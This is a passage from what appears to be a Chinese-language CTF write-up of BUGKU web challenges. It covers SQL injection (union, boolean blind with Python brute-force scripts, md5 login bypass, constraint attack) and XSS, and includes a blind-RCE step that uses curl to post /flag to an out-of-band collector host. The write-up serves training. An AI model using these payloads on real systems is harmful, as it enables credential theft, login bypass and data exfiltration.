class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>考查的是file_get_contents()函数，不会的自行百度哈</p>
<p>大致意思就是要上传 ac和fn两个参数</p>
<p>且ac的值等于fn文件内容的值,但是这里的话是没法满足判断句的，那我们试着绕过一下这个判断句</p>
<p>file_get_contents()绕过我们用伪协议进行绕过</p>
<p>payload:</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126140411099.png" alt="image-20241126140411099"></p>
<h2 id="Simple-SQL-injection"><a href="#Simple-SQL-injection" class="headerlink" title="Simple SQL injection"></a>Simple SQL injection</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="#SQL注入"></a>#SQL注入</h3><p>提示分析新闻详情页的URL参数，随便点一个新闻发现URL中有id参数，加单引号出现报错，存在SQL注入</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/article?id=1&#x27;	#报错</span><br><span class="line">/article?id=1 and 1=1 正常显示</span><br><span class="line">/article?id=1 and 1=2 文章不存在</span><br></pre></td></tr></table></figure>

<p>数字型注入，那接着直接打POC就行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/article?id=1 union select 1,2#</span><br></pre></td></tr></table></figure>

<p>但是在进行查询的时候一直出现报错，最后在登录页面传入万能密码直接就拿到flag了。。。</p>
<h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="#SQL联合注入"></a>#SQL联合注入</h3><p>用1和1’测试闭合方式，发现是单引号闭合</p>
<p>用order by测试回显字段数发现字段数是4</p>
<p>用union select查看回显位置</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241126141535282.png" alt="image-20241126141535282"></p>
<p>既然没有过滤那就用联合查询进行注入</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询数据库名</span><br><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span><span class="meta">#</span></span><br><span class="line">查询表名</span><br><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;skctf&#x27;</span>),<span class="number">3</span>,<span class="number">4</span><span class="meta">#</span></span><br><span class="line">查询表中列名</span><br><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;fl4g&#x27;</span>),<span class="number">3</span>,<span class="number">4</span><span class="meta">#</span></span><br><span class="line">查询列中数据</span><br><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">skctf_flag</span>)<span class="keyword">from</span> skctf.fl4g),3,4#</span></span><br></pre></td></tr></table></figure>

<h2 id="no-select"><a href="#no-select" class="headerlink" title="no select"></a>no select</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="#万能密码"></a>#万能密码</h3><p>猜测是开始有过滤了，而且过滤的还是select</p>
<p>我试了一下万能密码发现能打通</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><h3 id="sql注入md5绕过"><a href="#sql注入md5绕过" class="headerlink" title="#sql注入md5绕过"></a>#sql注入md5绕过</h3><p>测试之后发现都是登录失败，抓包看看有没有什么线索</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126143402053.png" alt="image-20241126143402053"></p>
<p>发现一个tip很显眼啊，拿去解码一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话是需要让row中password的md5值等于password，但是这里的话我们是不知道里面有哪些用户和密码的，这时候有个思路就是</p>
<p>通过输入不存在的用户构造新的用户和密码去进行登录</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin&#x27; union select 1,<span class="string">&#x27;md5(123)&#x27;</span>#&amp;<span class="attribute">password</span>=123  </span><br><span class="line">这里将123的md5值换进去就行</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145315853.png" alt="image-20241126145315853"></p>
<p>这里可以看到一个index.php，我们访问一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145257655.png" alt="image-20241126145257655"></p>
<p>无回显RCE可以直接打curl外带</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;curl -X POST -F xx=@/flag  http://yacgwxvhy7jd2crte67tuxg8lzrqfg35.oastify.com</span><br></pre></td></tr></table></figure>

<p>这里换成bp里面服务器collarborator的地址，然后进行poll now就行了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126145916680.png" alt="image-20241126145916680"></p>
<p>或者也可以直接写文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span>:<span class="number">123</span> | cat /flag &gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p>查看 flag文件并输出到1.php里边</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.php可以在网站子目录查看内容拿到<span class="built_in">flag</span></span><br></pre></td></tr></table></figure>

<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="基于布尔的sql盲注"><a href="#基于布尔的sql盲注" class="headerlink" title="#基于布尔的sql盲注"></a>#基于布尔的sql盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">admin</span>/<span class="number">1</span>   <span class="keyword">password</span> error!</span><br><span class="line"><span class="keyword">admin</span><span class="string">&#x27;/1  username does not exist!</span></span><br></pre></td></tr></table></figure>

<p>注入点应该就是username了，然后fuzz一下过滤，发现空格被过滤了，用联合注释符绕过就行</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; /<span class="number">1</span>  username <span class="keyword">does</span> <span class="keyword">not</span> exist!</span><br><span class="line"><span class="number">1</span>&#x27;||(<span class="built_in">length</span>(database())&gt;<span class="number">0</span>)<span class="comment"># / 1  password error!</span></span><br><span class="line"><span class="number">1</span>&#x27;||(<span class="built_in">length</span>(database())&lt;<span class="number">0</span>)<span class="comment"># / 1  username does not exist!</span></span><br></pre></td></tr></table></figure>

<p>1用户是不存在的，但是因为我们的or语句，右边是满足的，所以返回true，所以第二个测试回显密码错误而不是用户不存在</p>
<p>在构造的时候发现过滤了逗号，还过滤了for，那就不能截取字符了，但是like也被过滤了，不过能用regexp</p>
<p>测出来数据库名是以b开头的</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;||((select(database()))regexp(&#x27;^b&#x27;))#password error!</span><br><span class="line"><span class="number">1</span>&#x27;||((select(database()))regexp(&#x27;^c&#x27;))#username does not exist!</span><br></pre></td></tr></table></figure>

<p>既然测出来回显信息了那就直接打吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://117.72.52.127:13589/index.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;||((select(database()))regexp(&#x27;^&#123;target+j&#125;&#x27;))#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;||((select(group_concat(password))from(blindsql.admin))regexp(&#x27;^<span class="subst">&#123;target + j&#125;</span>&#x27;))#&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            sign = <span class="number">1</span></span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>拿到密码4dcc88f8f1bc05e7c2ad1a60288481a2后登录发现不对，md5？解密一下<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p><img src="/../image/achieve/202411/BUGKU/image-20250611175944476.png" alt="image-20250611175944476"></p>
<h2 id="都过滤了"><a href="#都过滤了" class="headerlink" title="都过滤了"></a>都过滤了</h2><h3 id="布尔盲注-命令执行绕过"><a href="#布尔盲注-命令执行绕过" class="headerlink" title="#布尔盲注+命令执行绕过"></a>#布尔盲注+命令执行绕过</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin/1		#password error!!@_@</span><br><span class="line">admin&#x27;/1	#username error!!@_@</span><br></pre></td></tr></table></figure>

<p>注入点在username处，测过滤发现过滤了<code>/**/</code>，<code>||</code>，<code>or</code>，<code>and</code>，但是可以用位运算符<code>^</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;^1^&#x27;	#username error!!@_@</span><br><span class="line">admin&#x27;^0^&#x27;	#password error!!@_@</span><br></pre></td></tr></table></figure>

<p>由于在字符串和数字进行运算的时候会将字符串转化成0，所以前面<code>&quot;admin&quot;^1</code>的结果是<code>0 ^ 1 = 1</code>，<code>&quot;admin&quot;^0</code>的结果是<code>0 ^ 0 = 0</code></p>
<p>而后面再异或0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ^ <span class="string">&quot;&quot;</span>  =&gt;  <span class="number">1</span> ^ <span class="number">0</span>  = <span class="number">1</span> </span><br><span class="line"><span class="number">0</span> ^ <span class="string">&quot;&quot;</span>  =&gt;  <span class="number">0</span> ^ <span class="number">0</span>  = <span class="number">0</span> </span><br></pre></td></tr></table></figure>

<p>所以这里<code>username error!!@_@</code>就是正确的回显，直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://171.80.2.169:16571/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    payload1 = <span class="string">f&quot;admin&#x27;^(length(passwd)=<span class="subst">&#123;i&#125;</span>)^&#x27;&quot;</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;uname&quot;</span> : payload1,</span><br><span class="line">        <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;123&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(data1)</span><br><span class="line">    r1 = requests.post(url, data=data1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;password&#x27;s length is &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        payload2 = <span class="string">f&quot;admin&#x27;^(ascii(mid((passwd)from(<span class="subst">&#123;i&#125;</span>)))=<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>)^&#x27;&quot;</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span> : payload2,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data2)</span><br><span class="line">        r2 = requests.post(url, data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password is&quot;</span>, password)</span><br><span class="line"><span class="comment">#password&#x27;s length is 32</span></span><br><span class="line"><span class="comment">#password is 4dcc88f8f1bc05e7c2ad1a60288481a2</span></span><br></pre></td></tr></table></figure>

<p>拿去md5解密得到密码bugkuctf</p>
<p>然后有一个命令执行的面板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;/flag</span><br></pre></td></tr></table></figure>

<p>当然这里还有一种做法，就是让用户名和数字做<code>-</code>法</p>
<h3 id="减法查询绕过"><a href="#减法查询绕过" class="headerlink" title="减法查询绕过"></a>减法查询绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username   <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test       <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> bao        <span class="operator">|</span> <span class="number">1008611</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> wanth3f1ag <span class="operator">|</span> <span class="number">1008</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> <span class="number">1008</span>       <span class="operator">|</span> <span class="number">11111</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span><span class="number">-0</span><span class="operator">-</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username   <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test       <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> bao        <span class="operator">|</span> <span class="number">1008611</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> wanth3f1ag <span class="operator">|</span> <span class="number">1008</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">4</span> warnings (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span><span class="number">-1</span><span class="operator">-</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span>, <span class="number">4</span> warnings (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username   <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test       <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> bao        <span class="operator">|</span> <span class="number">1008611</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> wanth3f1ag <span class="operator">|</span> <span class="number">1008</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">3</span> warnings (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>有人可能问，最后一个poc不是查询用户名为 0 的用户吗，怎么都查出来了，因为SQL 会自动把 username 字段的每一个值都转成数值，再和 0 对比；只要username的首个字符是字符而不是数字，转成数值后都是 0，所以 username &#x3D; 0 会匹配几乎所有用户。</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#zjJeh">https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#zjJeh</a> 这位师傅的wp挺详细的</p>
<h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><h3 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="#SQL约束攻击"></a>#SQL约束攻击</h3><p>其实就是一个sql处理的差异，在SQL中执行字符串处理和比较时，字符串末尾的空格符将会被删除。</p>
<p>所以这里可以直接注册admin+空格的账户覆盖admin用户的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin </span><br><span class="line">111aaaAAA</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cs-cshi.github.io/cybersecurity/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/">https://cs-cshi.github.io/cybersecurity/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/</a></p>
<h2 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h2><h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="#反射性xss"></a>#反射性xss</h3><p>输入正常的xss语句看看效果</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现括号被转化成|</p>
<p>扫目录发现了两个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin.php</span><br><span class="line"></span><br><span class="line">/db.sql</span><br></pre></td></tr></table></figure>

<p>admin.php是一个登录界面，但是这个db.sql访问是404，不知道是环境问题还是什么，所以只好从大佬的wp上摘下来了</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># Host: localhost  (<span class="keyword">Version</span>: <span class="number">5.5</span><span class="number">.53</span>)</span><br><span class="line"># <span class="type">Date</span>: <span class="number">2019</span><span class="number">-08</span><span class="number">-04</span> <span class="number">16</span>:<span class="number">13</span>:<span class="number">22</span></span><br><span class="line"># Generator: MySQL-Front <span class="number">5.3</span>  (Build <span class="number">4.234</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*!40101 SET NAMES utf8 */</span>;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Structure <span class="keyword">for</span> <span class="keyword">table</span> &quot;text&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> xss <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line">use xss; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> `<span class="type">text</span>`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `<span class="type">text</span>` (</span><br><span class="line">  `Id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `<span class="type">text</span>` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`Id`)</span><br><span class="line">) ENGINE=MyISAM <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Data <span class="keyword">for</span> <span class="keyword">table</span> &quot;text&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `text` DISABLE KEYS */</span>;</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `text` ENABLE KEYS */</span>;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Structure <span class="keyword">for</span> <span class="keyword">table</span> &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> `<span class="keyword">user</span>`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `<span class="keyword">user</span>` (</span><br><span class="line">  `Id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `<span class="keyword">password</span>` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`Id`)</span><br><span class="line">) ENGINE=MyISAM <span class="keyword">DEFAULT</span> CHARSET=utf8;</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Data <span class="keyword">for</span> <span class="keyword">table</span> &quot;user&quot;</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `user` DISABLE 